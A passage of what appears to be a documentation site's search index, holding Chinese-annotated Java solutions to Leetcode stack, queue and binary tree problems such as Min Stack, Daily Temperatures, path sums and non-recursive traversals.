\u5728\u5C06\u4E00\u4E2A\u5143\u7D20 x \u63D2\u5165\u961F\u5217\u65F6\uFF0C\u4E3A\u4E86\u7EF4\u62A4\u539F\u6765\u7684\u540E\u8FDB\u5148\u51FA\u987A\u5E8F\uFF0C\u9700\u8981\u8BA9 x \u63D2\u5165\u961F\u5217\u9996\u90E8\u3002\u800C\u961F\u5217\u7684\u9ED8\u8BA4\u63D2\u5165\u987A\u5E8F\u662F\u961F\u5217\u5C3E\u90E8\uFF0C\u56E0\u6B64\u5728\u5C06 x \u63D2\u5165\u961F\u5217\u5C3E\u90E8\u4E4B\u540E\uFF0C\u9700\u8981\u8BA9\u9664\u4E86 x \u4E4B\u5916\u7684\u6240\u6709\u5143\u7D20\u51FA\u961F\u5217\uFF0C\u518D\u5165\u961F\u5217\u3002
class MyStack { private Queue<Integer> queue; public MyStack() { queue = new LinkedList<>(); } public void push(int x) { queue.add(x); int cnt = queue.size(); while (cnt-- > 1) { queue.add(queue.poll()); } } public int pop() { return queue.remove(); } public int top() { return queue.peek(); } public boolean empty() { return queue.isEmpty(); }
}`},{header:"3. \u6700\u5C0F\u503C\u6808",slug:"_3-\u6700\u5C0F\u503C\u6808",content:`155. Min Stack (Easy)
Leetcode / \u529B\u6263
class MinStack { private Stack<Integer> dataStack; private Stack<Integer> minStack; private int min; public MinStack() { dataStack = new Stack<>(); minStack = new Stack<>(); min = Integer.MAX_VALUE; } public void push(int x) { dataStack.add(x); min = Math.min(min, x); minStack.add(min); } public void pop() { dataStack.pop(); minStack.pop(); min = minStack.isEmpty() ? Integer.MAX_VALUE : minStack.peek(); } public int top() { return dataStack.peek(); } public int getMin() { return minStack.peek(); }
}
\u5BF9\u4E8E\u5B9E\u73B0\u6700\u5C0F\u503C\u961F\u5217\u95EE\u9898\uFF0C\u53EF\u4EE5\u5148\u5C06\u961F\u5217\u4F7F\u7528\u6808\u6765\u5B9E\u73B0\uFF0C\u7136\u540E\u5C31\u5C06\u95EE\u9898\u8F6C\u6362\u4E3A\u6700\u5C0F\u503C\u6808\uFF0C\u8FD9\u4E2A\u95EE\u9898\u51FA\u73B0\u5728 \u7F16\u7A0B\u4E4B\u7F8E\uFF1A3.7\u3002`},{header:"4. \u7528\u6808\u5B9E\u73B0\u62EC\u53F7\u5339\u914D",slug:"_4-\u7528\u6808\u5B9E\u73B0\u62EC\u53F7\u5339\u914D",content:`20. Valid Parentheses (Easy)
Leetcode / \u529B\u6263
"()[]{}" Output : true
public boolean isValid(String s) { Stack<Character> stack = new Stack<>(); for (char c : s.toCharArray()) { if (c == '(' || c == '{' || c == '[') { stack.push(c); } else { if (stack.isEmpty()) { return false; } char cStack = stack.pop(); boolean b1 = c == ')' && cStack != '('; boolean b2 = c == ']' && cStack != '['; boolean b3 = c == '}' && cStack != '{'; if (b1 || b2 || b3) { return false; } } } return stack.isEmpty();
}`},{header:"5. \u6570\u7EC4\u4E2D\u5143\u7D20\u4E0E\u4E0B\u4E00\u4E2A\u6BD4\u5B83\u5927\u7684\u5143\u7D20\u4E4B\u95F4\u7684\u8DDD\u79BB",slug:"_5-\u6570\u7EC4\u4E2D\u5143\u7D20\u4E0E\u4E0B\u4E00\u4E2A\u6BD4\u5B83\u5927\u7684\u5143\u7D20\u4E4B\u95F4\u7684\u8DDD\u79BB",content:`739. Daily Temperatures (Medium)
Leetcode / \u529B\u6263
Input: [73, 74, 75, 71, 69, 72, 76, 73]
Output: [1, 1, 4, 2, 1, 1, 0, 0]
\u5728\u904D\u5386\u6570\u7EC4\u65F6\u7528\u6808\u628A\u6570\u7EC4\u4E2D\u7684\u6570\u5B58\u8D77\u6765\uFF0C\u5982\u679C\u5F53\u524D\u904D\u5386\u7684\u6570\u6BD4\u6808\u9876\u5143\u7D20\u6765\u7684\u5927\uFF0C\u8BF4\u660E\u6808\u9876\u5143\u7D20\u7684\u4E0B\u4E00\u4E2A\u6BD4\u5B83\u5927\u7684\u6570\u5C31\u662F\u5F53\u524D\u5143\u7D20\u3002
public int[] dailyTemperatures(int[] temperatures) { int n = temperatures.length; int[] dist = new int[n]; Stack<Integer> indexs = new Stack<>(); for (int curIndex = 0; curIndex < n; curIndex++) { while (!indexs.isEmpty() && temperatures[curIndex] > temperatures[indexs.peek()]) { int preIndex = indexs.pop(); dist[preIndex] = curIndex - preIndex; } indexs.add(curIndex); } return dist;
}`},{header:"6. \u5FAA\u73AF\u6570\u7EC4\u4E2D\u6BD4\u5F53\u524D\u5143\u7D20\u5927\u7684\u4E0B\u4E00\u4E2A\u5143\u7D20",slug:"_6-\u5FAA\u73AF\u6570\u7EC4\u4E2D\u6BD4\u5F53\u524D\u5143\u7D20\u5927\u7684\u4E0B\u4E00\u4E2A\u5143\u7D20",content:`503. Next Greater Element II (Medium)
Leetcode / \u529B\u6263
Input: [1,2,1]
Output: [2,-1,2]
Explanation: The first 1's next greater number is 2;
The number 2 can't find next greater number;
The second 1's next greater number needs to search circularly, which is also 2.
\u4E0E 739. Daily Temperatures (Medium) \u4E0D\u540C\u7684\u662F\uFF0C\u6570\u7EC4\u662F\u5FAA\u73AF\u6570\u7EC4\uFF0C\u5E76\u4E14\u6700\u540E\u8981\u6C42\u7684\u4E0D\u662F\u8DDD\u79BB\u800C\u662F\u4E0B\u4E00\u4E2A\u5143\u7D20\u3002
public int[] nextGreaterElements(int[] nums) { int n = nums.length; int[] next = new int[n]; Arrays.fill(next, -1); Stack<Integer> pre = new Stack<>(); for (int i = 0; i < n * 2; i++) { int num = nums[i % n]; while (!pre.isEmpty() && nums[pre.peek()] < num) { next[pre.pop()] = num; } if (i < n){ pre.push(i); } } return next;
}`}]},{path:"/leetcode/Leetcode%20%E9%A2%98%E8%A7%A3%20-%20%E6%A0%91.html",title:"Leetcode \u9898\u89E3 - \u6811",pathLocale:"/",contents:[{header:"Leetcode \u9898\u89E3 - \u6811",slug:"leetcode-\u9898\u89E3-\u6811",content:`Leetcode \u9898\u89E3 - \u6811 \u9012\u5F52 1. \u6811\u7684\u9AD8\u5EA6
2. \u5E73\u8861\u6811
3. \u4E24\u8282\u70B9\u7684\u6700\u957F\u8DEF\u5F84
4. \u7FFB\u8F6C\u6811
5. \u5F52\u5E76\u4E24\u68F5\u6811
6. \u5224\u65AD\u8DEF\u5F84\u548C\u662F\u5426\u7B49\u4E8E\u4E00\u4E2A\u6570
7. \u7EDF\u8BA1\u8DEF\u5F84\u548C\u7B49\u4E8E\u4E00\u4E2A\u6570\u7684\u8DEF\u5F84\u6570\u91CF
8. \u5B50\u6811
9. \u6811\u7684\u5BF9\u79F0
10. \u6700\u5C0F\u8DEF\u5F84
11. \u7EDF\u8BA1\u5DE6\u53F6\u5B50\u8282\u70B9\u7684\u548C
12. \u76F8\u540C\u8282\u70B9\u503C\u7684\u6700\u5927\u8DEF\u5F84\u957F\u5EA6
13. \u95F4\u9694\u904D\u5386
14. \u627E\u51FA\u4E8C\u53C9\u6811\u4E2D\u7B2C\u4E8C\u5C0F\u7684\u8282\u70B9 \u5C42\u6B21\u904D\u5386 1. \u4E00\u68F5\u6811\u6BCF\u5C42\u8282\u70B9\u7684\u5E73\u5747\u6570
2. \u5F97\u5230\u5DE6\u4E0B\u89D2\u7684\u8282\u70B9 \u524D\u4E2D\u540E\u5E8F\u904D\u5386 1. \u975E\u9012\u5F52\u5B9E\u73B0\u4E8C\u53C9\u6811\u7684\u524D\u5E8F\u904D\u5386
2. \u975E\u9012\u5F52\u5B9E\u73B0\u4E8C\u53C9\u6811\u7684\u540E\u5E8F\u904D\u5386
3. \u975E\u9012\u5F52\u5B9E\u73B0\u4E8C\u53C9\u6811\u7684\u4E2D\u5E8F\u904D\u5386 BST 1. \u4FEE\u526A\u4E8C\u53C9\u67E5\u627E\u6811
2. \u5BFB\u627E\u4E8C\u53C9\u67E5\u627E\u6811\u7684\u7B2C k \u4E2A\u5143\u7D20
3. \u628A\u4E8C\u53C9\u67E5\u627E\u6811\u6BCF\u4E2A\u8282\u70B9\u7684\u503C\u90FD\u52A0\u4E0A\u6BD4\u5B83\u5927\u7684\u8282\u70B9\u7684\u503C
4. \u4E8C\u53C9\u67E5\u627E\u6811\u7684\u6700\u8FD1\u516C\u5171\u7956\u5148
5. \u4E8C\u53C9\u6811\u7684\u6700\u8FD1\u516C\u5171\u7956\u5148
6. \u4ECE\u6709\u5E8F\u6570\u7EC4\u4E2D\u6784\u9020\u4E8C\u53C9\u67E5\u627E\u6811
7. \u6839\u636E\u6709\u5E8F\u94FE\u8868\u6784\u9020\u5E73\u8861\u7684\u4E8C\u53C9\u67E5\u627E\u6811
8. \u5728\u4E8C\u53C9\u67E5\u627E\u6811\u4E2D\u5BFB\u627E\u4E24\u4E2A\u8282\u70B9\uFF0C\u4F7F\u5B83\u4EEC\u7684\u548C\u4E3A\u4E00\u4E2A\u7ED9\u5B9A\u503C
9. \u5728\u4E8C\u53C9\u67E5\u627E\u6811\u4E2D\u67E5\u627E\u4E24\u4E2A\u8282\u70B9\u4E4B\u5DEE\u7684\u6700\u5C0F\u7EDD\u5BF9\u503C
10. \u5BFB\u627E\u4E8C\u53C9\u67E5\u627E\u6811\u4E2D\u51FA\u73B0\u6B21\u6570\u6700\u591A\u7684\u503C Trie 1. \u5B9E\u73B0\u4E00\u4E2A Trie
2. \u5B9E\u73B0\u4E00\u4E2A Trie\uFF0C\u7528\u6765\u6C42\u524D\u7F00\u548C`},{header:"\u9012\u5F52",slug:"\u9012\u5F52",content:"\u4E00\u68F5\u6811\u8981\u4E48\u662F\u7A7A\u6811\uFF0C\u8981\u4E48\u6709\u4E24\u4E2A\u6307\u9488\uFF0C\u6BCF\u4E2A\u6307\u9488\u6307\u5411\u4E00\u68F5\u6811\u3002\u6811\u662F\u4E00\u79CD\u9012\u5F52\u7ED3\u6784\uFF0C\u5F88\u591A\u6811\u7684\u95EE\u9898\u53EF\u4EE5\u4F7F\u7528\u9012\u5F52\u6765\u5904\u7406\u3002"},{header:"1. \u6811\u7684\u9AD8\u5EA6",slug:"_1-\u6811\u7684\u9AD8\u5EA6",content:`104. Maximum Depth of Binary Tree (Easy)
Leetcode / \u529B\u6263
public int maxDepth(TreeNode root) { if (root == null) return 0; return Math.max(maxDepth(root.left), maxDepth(root.right)) + 1;
}`},{header:"2. \u5E73\u8861\u6811",slug:"_2-\u5E73\u8861\u6811",content:`110. Balanced Binary Tree (Easy)
Leetcode / \u529B\u6263 3 / \\ 9 20 / \\ 15 7
\u5E73\u8861\u6811\u5DE6\u53F3\u5B50\u6811\u9AD8\u5EA6\u5DEE\u90FD\u5C0F\u4E8E\u7B49\u4E8E 1
private boolean result = true; public boolean isBalanced(TreeNode root) { maxDepth(root); return result;
} public int maxDepth(TreeNode root) { if (root == null) return 0; int l = maxDepth(root.left); int r = maxDepth(root.right); if (Math.abs(l - r) > 1) result = false; return 1 + Math.max(l, r);
}`},{header:"3. \u4E24\u8282\u70B9\u7684\u6700\u957F\u8DEF\u5F84",slug:"_3-\u4E24\u8282\u70B9\u7684\u6700\u957F\u8DEF\u5F84",content:`543. Diameter of Binary Tree (Easy)
Leetcode / \u529B\u6263
Input: 1 / \\ 2 3 / \\ 4 5 Return 3, which is the length of the path [4,2,1,3] or [5,2,1,3].
private int max = 0; public int diameterOfBinaryTree(TreeNode root) { depth(root); return max;
} private int depth(TreeNode root) { if (root == null) return 0; int leftDepth = depth(root.left); int rightDepth = depth(root.right); max = Math.max(max, leftDepth + rightDepth); return Math.max(leftDepth, rightDepth) + 1;
}`},{header:"4. \u7FFB\u8F6C\u6811",slug:"_4-\u7FFB\u8F6C\u6811",content:`226. Invert Binary Tree (Easy)
Leetcode / \u529B\u6263
public TreeNode invertTree(TreeNode root) { if (root == null) return null; TreeNode left = root.left; // \u540E\u9762\u7684\u64CD\u4F5C\u4F1A\u6539\u53D8 left \u6307\u9488\uFF0C\u56E0\u6B64\u5148\u4FDD\u5B58\u4E0B\u6765 root.left = invertTree(root.right); root.right = invertTree(left); return root;
}`},{header:"5. \u5F52\u5E76\u4E24\u68F5\u6811",slug:"_5-\u5F52\u5E76\u4E24\u68F5\u6811",content:`617. Merge Two Binary Trees (Easy)
Leetcode / \u529B\u6263
Input: Tree 1 Tree 2 1 2 / \\ / \\ 3 2 1 3 / \\ \\ 5 4 7 Output: 3 / \\ 4 5 / \\ \\ 5 4 7
public TreeNode mergeTrees(TreeNode t1, TreeNode t2) { if (t1 == null && t2 == null) return null; if (t1 == null) return t2; if (t2 == null) return t1; TreeNode root = new TreeNode(t1.val + t2.val); root.left = mergeTrees(t1.left, t2.left); root.right = mergeTrees(t1.right, t2.right); return root;
}`},{header:"6. \u5224\u65AD\u8DEF\u5F84\u548C\u662F\u5426\u7B49\u4E8E\u4E00\u4E2A\u6570",slug:"_6-\u5224\u65AD\u8DEF\u5F84\u548C\u662F\u5426\u7B49\u4E8E\u4E00\u4E2A\u6570",content:`Leetcdoe : 112. Path Sum (Easy)
Leetcode / \u529B\u6263
Given the below binary tree and sum = 22, 5 / \\ 4 8 / / \\ 11 13 4 / \\ \\ 7 2 1 return true, as there exist a root-to-leaf path 5->4->11->2 which sum is 22.
\u8DEF\u5F84\u548C\u5B9A\u4E49\u4E3A\u4ECE root \u5230 leaf \u7684\u6240\u6709\u8282\u70B9\u7684\u548C\u3002
public boolean hasPathSum(TreeNode root, int sum) { if (root == null) return false; if (root.left == null && root.right == null && root.val == sum) return true; return hasPathSum(root.left, sum - root.val) || hasPathSum(root.right, sum - root.val);
}`},{header:"7. \u7EDF\u8BA1\u8DEF\u5F84\u548C\u7B49\u4E8E\u4E00\u4E2A\u6570\u7684\u8DEF\u5F84\u6570\u91CF",slug:"_7-\u7EDF\u8BA1\u8DEF\u5F84\u548C\u7B49\u4E8E\u4E00\u4E2A\u6570\u7684\u8DEF\u5F84\u6570\u91CF",content:`437. Path Sum III (Easy)
Leetcode / \u529B\u6263
root = [10,5,-3,3,2,null,11,3,-2,null,1], sum = 8 10 / \\ 5 -3 / \\ \\ 3 2 11 / \\ \\
3 -2 1 Return 3. The paths that sum to 8 are: 1. 5 -> 3
2. 5 -> 2 -> 1
3. -3 -> 11
\u8DEF\u5F84\u4E0D\u4E00\u5B9A\u4EE5 root \u5F00\u5934\uFF0C\u4E5F\u4E0D\u4E00\u5B9A\u4EE5 leaf \u7ED3\u5C3E\uFF0C\u4F46\u662F\u5FC5\u987B\u8FDE\u7EED\u3002
public int pathSum(TreeNode root, int sum) { if (root == null) return 0; int ret = pathSumStartWithRoot(root, sum) + pathSum(root.left, sum) + pathSum(root.right, sum); return ret;
} private int pathSumStartWithRoot(TreeNode root, int sum) { if (root == null) return 0; int ret = 0; if (root.val == sum) ret++; ret += pathSumStartWithRoot(root.left, sum - root.val) + pathSumStartWithRoot(root.right, sum - root.val); return ret;
}`},{header:"8. \u5B50\u6811",slug:"_8-\u5B50\u6811",content:`572. Subtree of Another Tree (Easy)
Leetcode / \u529B\u6263
Given tree s: 3 / \\ 4 5 / \\ 1 2 Given tree t: 4 / \\ 1 2 Return true, because t has the same structure and node values with a subtree of s. Given tree s: 3 / \\ 4 5 / \\ 1 2 / 0 Given tree t: 4 / \\ 1 2 Return false.
public boolean isSubtree(TreeNode s, TreeNode t) { if (s == null) return false; return isSubtreeWithRoot(s, t) || isSubtree(s.left, t) || isSubtree(s.right, t);
} private boolean isSubtreeWithRoot(TreeNode s, TreeNode t) { if (t == null && s == null) return true; if (t == null || s == null) return false; if (t.val != s.val) return false; return isSubtreeWithRoot(s.left, t.left) && isSubtreeWithRoot(s.right, t.right);
}`},{header:"9. \u6811\u7684\u5BF9\u79F0",slug:"_9-\u6811\u7684\u5BF9\u79F0",content:`101. Symmetric Tree (Easy)
Leetcode / \u529B\u6263 1 / \\ 2 2 / \\ / \\
3 4 4 3
public boolean isSymmetric(TreeNode root) { if (root == null) return true; return isSymmetric(root.left, root.right);
} private boolean isSymmetric(TreeNode t1, TreeNode t2) { if (t1 == null && t2 == null) return true; if (t1 == null || t2 == null) return false; if (t1.val != t2.val) return false; return isSymmetric(t1.left, t2.right) && isSymmetric(t1.right, t2.left);
}`},{header:"10. \u6700\u5C0F\u8DEF\u5F84",slug:"_10-\u6700\u5C0F\u8DEF\u5F84",content:`111. Minimum Depth of Binary Tree (Easy)
Leetcode / \u529B\u6263
\u6811\u7684\u6839\u8282\u70B9\u5230\u53F6\u5B50\u8282\u70B9\u7684\u6700\u5C0F\u8DEF\u5F84\u957F\u5EA6
public int minDepth(TreeNode root) { if (root == null) return 0; int left = minDepth(root.left); int right = minDepth(root.right); if (left == 0 || right == 0) return left + right + 1; return Math.min(left, right) + 1;
}`},{header:"11. \u7EDF\u8BA1\u5DE6\u53F6\u5B50\u8282\u70B9\u7684\u548C",slug:"_11-\u7EDF\u8BA1\u5DE6\u53F6\u5B50\u8282\u70B9\u7684\u548C",content:`404. Sum of Left Leaves (Easy)
Leetcode / \u529B\u6263 3 / \\ 9 20 / \\ 15 7 There are two left leaves in the binary tree, with values 9 and 15 respectively. Return 24.
public int sumOfLeftLeaves(TreeNode root) { if (root == null) return 0; if (isLeaf(root.left)) return root.left.val + sumOfLeftLeaves(root.right); return sumOfLeftLeaves(root.left) + sumOfLeftLeaves(root.right);
} private boolean isLeaf(TreeNode node){ if (node == null) return false; return node.left == null && node.right == null;
}`},{header:"12. \u76F8\u540C\u8282\u70B9\u503C\u7684\u6700\u5927\u8DEF\u5F84\u957F\u5EA6",slug:"_12-\u76F8\u540C\u8282\u70B9\u503C\u7684\u6700\u5927\u8DEF\u5F84\u957F\u5EA6",content:`687. Longest Univalue Path (Easy)
Leetcode / \u529B\u6263 1 / \\ 4 5 / \\ \\ 4 4 5 Output : 2
private int path = 0; public int longestUnivaluePath(TreeNode root) { dfs(root); return path;
} private int dfs(TreeNode root){ if (root == null) return 0; int left = dfs(root.left); int right = dfs(root.right); int leftPath = root.left != null && root.left.val == root.val ? left + 1 : 0; int rightPath = root.right != null && root.right.val == root.val ? right + 1 : 0; path = Math.max(path, leftPath + rightPath); return Math.max(leftPath, rightPath);
}`},{header:"13. \u95F4\u9694\u904D\u5386",slug:"_13-\u95F4\u9694\u904D\u5386",content:`337. House Robber III (Medium)
Leetcode / \u529B\u6263 3 / \\ 2 3 \\ \\ 3 1
Maximum amount of money the thief can rob = 3 + 3 + 1 = 7.
Map<TreeNode, Integer> cache = new HashMap<>(); public int rob(TreeNode root) { if (root == null) return 0; if (cache.containsKey(root)) return cache.get(root); int val1 = root.val; if (root.left != null) val1 += rob(root.left.left) + rob(root.left.right); if (root.right != null) val1 += rob(root.right.left) + rob(root.right.right); int val2 = rob(root.left) + rob(root.right); int res = Math.max(val1, val2); cache.put(root, res); return res;
}`},{header:"14. \u627E\u51FA\u4E8C\u53C9\u6811\u4E2D\u7B2C\u4E8C\u5C0F\u7684\u8282\u70B9",slug:"_14-\u627E\u51FA\u4E8C\u53C9\u6811\u4E2D\u7B2C\u4E8C\u5C0F\u7684\u8282\u70B9",content:`671. Second Minimum Node In a Binary Tree (Easy)
Leetcode / \u529B\u6263
Input: 2 / \\ 2 5 / \\ 5 7 Output: 5
\u4E00\u4E2A\u8282\u70B9\u8981\u4E48\u5177\u6709 0 \u4E2A\u6216 2 \u4E2A\u5B50\u8282\u70B9\uFF0C\u5982\u679C\u6709\u5B50\u8282\u70B9\uFF0C\u90A3\u4E48\u6839\u8282\u70B9\u662F\u6700\u5C0F\u7684\u8282\u70B9\u3002
public int findSecondMinimumValue(TreeNode root) { if (root == null) return -1; if (root.left == null && root.right == null) return -1; int leftVal = root.left.val; int rightVal = root.right.val; if (leftVal == root.val) leftVal = findSecondMinimumValue(root.left); if (rightVal == root.val) rightVal = findSecondMinimumValue(root.right); if (leftVal != -1 && rightVal != -1) return Math.min(leftVal, rightVal); if (leftVal != -1) return leftVal; return rightVal;
}`},{header:"\u5C42\u6B21\u904D\u5386",slug:"\u5C42\u6B21\u904D\u5386",content:"\u4F7F\u7528 BFS \u8FDB\u884C\u5C42\u6B21\u904D\u5386\u3002\u4E0D\u9700\u8981\u4F7F\u7528\u4E24\u4E2A\u961F\u5217\u6765\u5206\u522B\u5B58\u50A8\u5F53\u524D\u5C42\u7684\u8282\u70B9\u548C\u4E0B\u4E00\u5C42\u7684\u8282\u70B9\uFF0C\u56E0\u4E3A\u5728\u5F00\u59CB\u904D\u5386\u4E00\u5C42\u7684\u8282\u70B9\u65F6\uFF0C\u5F53\u524D\u961F\u5217\u4E2D\u7684\u8282\u70B9\u6570\u5C31\u662F\u5F53\u524D\u5C42\u7684\u8282\u70B9\u6570\uFF0C\u53EA\u8981\u63A7\u5236\u904D\u5386\u8FD9\u4E48\u591A\u8282\u70B9\u6570\uFF0C\u5C31\u80FD\u4FDD\u8BC1\u8FD9\u6B21\u904D\u5386\u7684\u90FD\u662F\u5F53\u524D\u5C42\u7684\u8282\u70B9\u3002"},{header:"1. \u4E00\u68F5\u6811\u6BCF\u5C42\u8282\u70B9\u7684\u5E73\u5747\u6570",slug:"_1-\u4E00\u68F5\u6811\u6BCF\u5C42\u8282\u70B9\u7684\u5E73\u5747\u6570",content:`637. Average of Levels in Binary Tree (Easy)
Leetcode / \u529B\u6263
public List<Double> averageOfLevels(TreeNode root) { List<Double> ret = new ArrayList<>(); if (root == null) return ret; Queue<TreeNode> queue = new LinkedList<>(); queue.add(root); while (!queue.isEmpty()) { int cnt = queue.size(); double sum = 0; for (int i = 0; i < cnt; i++) { TreeNode node = queue.poll(); sum += node.val; if (node.left != null) queue.add(node.left); if (node.right != null) queue.add(node.right); } ret.add(sum / cnt); } return ret;
}`},{header:"2. \u5F97\u5230\u5DE6\u4E0B\u89D2\u7684\u8282\u70B9",slug:"_2-\u5F97\u5230\u5DE6\u4E0B\u89D2\u7684\u8282\u70B9",content:`513. Find Bottom Left Tree Value (Easy)
Leetcode / \u529B\u6263
Input: 1 / \\ 2 3 / / \\ 4 5 6 / 7 Output:
7
public int findBottomLeftValue(TreeNode root) { Queue<TreeNode> queue = new LinkedList<>(); queue.add(root); while (!queue.isEmpty()) { root = queue.poll(); if (root.right != null) queue.add(root.right); if (root.left != null) queue.add(root.left); } return root.val;
}`},{header:"\u524D\u4E2D\u540E\u5E8F\u904D\u5386",slug:"\u524D\u4E2D\u540E\u5E8F\u904D\u5386",content:`1 / \\ 2 3 / \\ \\
4 5 6 \u5C42\u6B21\u904D\u5386\u987A\u5E8F\uFF1A[1 2 3 4 5 6]
\u524D\u5E8F\u904D\u5386\u987A\u5E8F\uFF1A[1 2 4 5 3 6]
\u4E2D\u5E8F\u904D\u5386\u987A\u5E8F\uFF1A[4 2 5 1 3 6]
\u540E\u5E8F\u904D\u5386\u987A\u5E8F\uFF1A[4 5 2 6 3 1] \u5C42\u6B21\u904D\u5386\u4F7F\u7528 BFS \u5B9E\u73B0\uFF0C\u5229\u7528\u7684\u5C31\u662F BFS \u4E00\u5C42\u4E00\u5C42\u904D\u5386\u7684\u7279\u6027\uFF1B\u800C\u524D\u5E8F\u3001\u4E2D\u5E8F\u3001\u540E\u5E8F\u904D\u5386\u5229\u7528\u4E86 DFS \u5B9E\u73B0\u3002
\u524D\u5E8F\u3001\u4E2D\u5E8F\u3001\u540E\u5E8F\u904D\u53EA\u662F\u5728\u5BF9\u8282\u70B9\u8BBF\u95EE\u7684\u987A\u5E8F\u6709\u4E00\u70B9\u4E0D\u540C\uFF0C\u5176\u5B83\u90FD\u76F8\u540C\u3002
\u2460 \u524D\u5E8F
void dfs(TreeNode root) { visit(root); dfs(root.left); dfs(root.right);
}
\u2461 \u4E2D\u5E8F
void dfs(TreeNode root) { dfs(root.left); visit(root); dfs(root.right);
}
\u2462 \u540E\u5E8F
void dfs(TreeNode root) { dfs(root.left); dfs(root.right); visit(root);
}`},{header:"1. \u975E\u9012\u5F52\u5B9E\u73B0\u4E8C\u53C9\u6811\u7684\u524D\u5E8F\u904D\u5386",slug:"_1-\u975E\u9012\u5F52\u5B9E\u73B0\u4E8C\u53C9\u6811\u7684\u524D\u5E8F\u904D\u5386",content:`144. Binary Tree Preorder Traversal (Medium)
Leetcode / \u529B\u6263
public List<Integer> preorderTraversal(TreeNode root) { List<Integer> ret = new ArrayList<>(); Stack<TreeNode> stack = new Stack<>(); stack.push(root); while (!stack.isEmpty()) { TreeNode node = stack.pop(); if (node == null) continue; ret.add(node.val); stack.push(node.right); // \u5148\u53F3\u540E\u5DE6\uFF0C\u4FDD\u8BC1\u5DE6\u5B50\u6811\u5148\u904D\u5386 stack.push(node.left); } return ret;
}`},{header:"2. \u975E\u9012\u5F52\u5B9E\u73B0\u4E8C\u53C9\u6811\u7684\u540E\u5E8F\u904D\u5386",slug:"_2-\u975E\u9012\u5F52\u5B9E\u73B0\u4E8C\u53C9\u6811\u7684\u540E\u5E8F\u904D\u5386",content:`145. Binary Tree Postorder Traversal (Medium)
Leetcode / \u529B\u6263
\u524D\u5E8F\u904D\u5386\u4E3A root -> left -> right\uFF0C\u540E\u5E8F\u904D\u5386\u4E3A left -> right -> root\u3002\u53EF\u4EE5\u4FEE\u6539\u524D\u5E8F\u904D\u5386\u6210\u4E3A root -> right -> left\uFF0C\u90A3\u4E48\u8FD9\u4E2A\u987A\u5E8F\u5C31\u548C\u540E\u5E8F\u904D\u5386\u6B63\u597D\u76F8\u53CD\u3002
public List<Integer> postorderTraversal(TreeNode root) { List<Integer> ret = new ArrayList<>(); Stack<TreeNode> stack = new Stack<>(); stack.push(root); while (!stack.isEmpty()) { TreeNode node = stack.pop(); if (node == null) continue; ret.add(node.val); stack.push(node.left); stack.push(node.right); } Collections.reverse(ret); return ret;
}`},{header:"3. \u975E\u9012\u5F52\u5B9E\u73B0\u4E8C\u53C9\u6811\u7684\u4E2D\u5E8F\u904D\u5386",slug:"_3-\u975E\u9012\u5F52\u5B9E\u73B0\u4E8C\u53C9\u6811\u7684\u4E2D\u5E8F\u904D\u5386",content:`94. Binary Tree Inorder Traversal (Medium)
Leetcode / \u529B\u6263
public List<Integer> inorderTraversal(TreeNode root) { List<Integer> ret = new ArrayList<>(); if (root == null) return ret; Stack<TreeNode> stack = new Stack<>(); TreeNode cur = root; while (cur != null || !stack.isEmpty()) { while (cur != null) { stack.push(cur); cur = cur.left; } TreeNode node = stack.pop(); ret.add(node.val); cur = node.right; } return ret;
}`},{header:"BST",slug:"bst",content:`\u4E8C\u53C9\u67E5\u627E\u6811\uFF08BST\uFF09\uFF1A\u6839\u8282\u70B9\u5927\u4E8E\u7B49\u4E8E\u5DE6\u5B50\u6811\u6240\u6709\u8282\u70B9\uFF0C\u5C0F\u4E8E\u7B49\u4E8E\u53F3\u5B50\u6811\u6240\u6709\u8282\u70B9\u3002
\u4E8C\u53C9\u67E5\u627E\u6811\u4E2D\u5E8F\u904D\u5386\u6709\u5E8F\u3002`},{header:"1. \u4FEE\u526A\u4E8C\u53C9\u67E5\u627E\u6811",slug:"_1-\u4FEE\u526A\u4E8C\u53C9\u67E5\u627E\u6811",content:`669. Trim a Binary Search Tree (Easy)
Leetcode / \u529B\u6263
Input: 3 / \\ 0 4 \\ 2 / 1 L = 1 R = 3 Output: 3 / 2 / 1
\u9898\u76EE\u63CF\u8FF0\uFF1A\u53EA\u4FDD\u7559\u503C\u5728 L ~ R \u4E4B\u95F4\u7684\u8282\u70B9
public TreeNode trimBST(TreeNode root, int L, int R) { if (root == null) return null; if (root.val > R) return trimBST(root.left, L, R); if (root.val < L) return trimBST(root.right, L, R); root.left = trimBST(root.left, L, R); root.right = trimBST(root.right, L, R); return root;
}`},{header:"2. \u5BFB\u627E\u4E8C\u53C9\u67E5\u627E\u6811\u7684\u7B2C k \u4E2A\u5143\u7D20",slug:"_2-\u5BFB\u627E\u4E8C\u53C9\u67E5\u627E\u6811\u7684\u7B2C-k-\u4E2A\u5143\u7D20",content:`230. Kth Smallest Element in a BST (Medium)
Leetcode / \u529B\u6263
\u4E2D\u5E8F\u904D\u5386\u89E3\u6CD5\uFF1A
private int cnt = 0;
private int val; public int kthSmallest(TreeNode root, int k) { inOrder(root, k); return val;
} private void inOrder(TreeNode node, int k) { if (node == null) return; inOrder(node.left, k); cnt++; if (cnt == k) { val = node.val; return; } inOrder(node.right, k);
}
\u9012\u5F52\u89E3\u6CD5\uFF1A
public int kthSmallest(TreeNode root, int k) { int leftCnt = count(root.left); if (leftCnt == k - 1) return root.val; if (leftCnt > k - 1) return kthSmallest(root.left, k); return kthSmallest(root.right, k - leftCnt - 1);
} private int count(TreeNode node) { if (node == null) return 0; return 1 + count(node.left) + count(node.right);
}`},{header:"3. \u628A\u4E8C\u53C9\u67E5\u627E\u6811\u6BCF\u4E2A\u8282\u70B9\u7684\u503C\u90FD\u52A0\u4E0A\u6BD4\u5B83\u5927\u7684\u8282\u70B9\u7684\u503C",slug:"_3-\u628A\u4E8C\u53C9\u67E5\u627E\u6811\u6BCF\u4E2A\u8282\u70B9\u7684\u503C\u90FD\u52A0\u4E0A\u6BD4\u5B83\u5927\u7684\u8282\u70B9\u7684\u503C",content:`Convert BST to Greater Tree (Easy)
Leetcode / \u529B\u6263
Input: The root of a Binary Search Tree like this: 5 / \\ 2 13 Output: The root of a Greater Tree like this: 18 / \\ 20 13
\u5148\u904D\u5386\u53F3\u5B50\u6811\u3002
private int sum = 0; public TreeNode convertBST(TreeNode root) { traver(root); return root;
} private void traver(TreeNode node) { if (node == null) return; traver(node.right); sum += node.val; node.val = sum; traver(node.left);
}`},{header:"4. \u4E8C\u53C9\u67E5\u627E\u6811\u7684\u6700\u8FD1\u516C\u5171\u7956\u5148",slug:"_4-\u4E8C\u53C9\u67E5\u627E\u6811\u7684\u6700\u8FD1\u516C\u5171\u7956\u5148",content:`235. Lowest Common Ancestor of a Binary Search Tree (Easy)
